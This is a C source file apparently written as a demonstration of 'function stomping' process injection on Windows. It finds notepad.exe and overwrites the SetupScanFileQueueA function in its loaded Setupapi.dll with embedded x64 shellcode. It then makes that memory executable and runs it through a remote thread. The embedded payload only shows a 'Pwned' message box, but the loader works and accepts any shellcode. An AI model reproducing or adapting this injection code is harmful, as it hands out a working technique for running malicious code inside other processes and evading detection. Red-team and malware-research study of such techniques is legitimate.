#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <tlhelp32.h>

/*
    Replace a function's byte with new code. (Choose a not so used function to avoid crashes - MessageBox, etc.)

    In this exemple we will stomp the function SetupScanFileQueueA when Setupapi.dll is loaded.

*/
int get_notepad_pid(PHANDLE hProc, PDWORD PID){
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to take snapshot\n");
        return 0;
    }

    if (!Process32First(snapshot, &pe32)) {
        printf("[-] Failed to get first process\n");
        CloseHandle(snapshot);
        return 0;
    }

    do {
        if (strcmpi(pe32.szExeFile, "notepad.exe") == 0) {
            printf("[+] Found ! PID: %u - %s\n", pe32.th32ProcessID, pe32.szExeFile);
            *PID = pe32.th32ProcessID;
            *hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *PID);
            break;
        }
    } while (Process32Next(snapshot, &pe32));

    CloseHandle(snapshot);
    return 1;
}

void get_module_from_remote(IN int PID, OUT LPVOID* moduleAddr) {
    MODULEENTRY32 me32;
    me32.dwSize = sizeof(me32);
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, PID);
    PVOID baseRemote = NULL;

    if (Module32First(hSnap, &me32)) {
        do {
            if (_stricmp(me32.szModule, "Setupapi.dll") == 0) {
                baseRemote = me32.modBaseAddr;
                break;
            }
        } while (Module32Next(hSnap, &me32));
    }
    CloseHandle(hSnap);
    if (!baseRemote)
    printf("[-] Setupapi.dll not found in remote process\n");
    else *moduleAddr = baseRemote;
}

int main (int argc, char** argv){
    UCHAR shellcode_64[] = 
        "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xcc\x00\x00\x00\x41"
        "\x51\x41\x50\x52\x48\x31\xd2\x51\x56\x65\x48\x8b\x52\x60"
        "\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f"
        "\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02"
        "\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x48\x8b"
        "\x52\x20\x41\x51\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18"
        "\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00"
        "\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x44\x8b\x40\x20\x8b"
        "\x48\x18\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88"
        "\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\x41\xc1\xc9\x0d\xac"
        "\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39"
        "\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b"
        "\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48"
        "\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41"
        "\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
        "\x8b\x12\xe9\x4b\xff\xff\xff\x5d\xe8\x0b\x00\x00\x00\x75"
        "\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00\x59\x41\xba\x4c"
        "\x77\x26\x07\xff\xd5\x49\xc7\xc1\x00\x00\x00\x00\xe8\x11"
        "\x00\x00\x00\x49\x6e\x6a\x65\x63\x74\x65\x64\x20\x62\x79"
        "\x20\x52\x69\x64\x61\x00\x5a\xe8\x06\x00\x00\x00\x50\x77"
        "\x6e\x65\x64\x00\x41\x58\x48\x31\xc9\x41\xba\x45\x83\x56"
        "\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d"
        "\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75"
        "\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";
    size_t shellcode_64_sz = sizeof(shellcode_64);
    char nDLL[] = "Setupapi.dll";
    char nFunc[] = "SetupScanFileQueueA";

    HMODULE hModule = LoadLibraryA(nDLL);
    PVOID lpAddr = (PVOID)GetProcAddress(hModule, nFunc);
    uintptr_t offset = (uintptr_t)lpAddr - (uintptr_t)hModule;

    DWORD  PID     = 0;
    HANDLE hProc   = nullptr;
    get_notepad_pid(&hProc, &PID);

    LPVOID remote_moduleAddr = 0; 
    get_module_from_remote(PID, &remote_moduleAddr);
    if (!remote_moduleAddr) {
        return 1;
    }

    PVOID pAddrRemote = (PVOID)((uintptr_t)remote_moduleAddr + offset);

    printf("[*] Stomping %s from %s on notepad.exe [%u]\n", nFunc, nDLL, PID);
    
    DWORD dwOldProtection = 0;

    if (!VirtualProtectEx(hProc, pAddrRemote, shellcode_64_sz, PAGE_READWRITE, &dwOldProtection)){
		printf("[!] VirtualProtect [RW] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
    printf("[*] Protection set to RW\n ");

    size_t byteWritten = 0;
	WriteProcessMemory(hProc, pAddrRemote, shellcode_64, shellcode_64_sz, &byteWritten);
    printf("[*] Shellcode written\n ");

	if (!VirtualProtectEx(hProc, pAddrRemote, shellcode_64_sz, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect [RWX] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
    printf("[*] Protection set to RWX\n ");

    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pAddrRemote, NULL, 0, NULL);
    if (hThread == NULL) {
        printf("CreateRemoteThread failed : %ul\n", GetLastError());
        return 1;
    }
    printf("[+] Remote thread created.\n");
    printf("[+] Waiting for thread.\n");
    WaitForSingleObject(hThread, INFINITE);
    printf("[+] Sehellcode done.\n");

    return 0;
}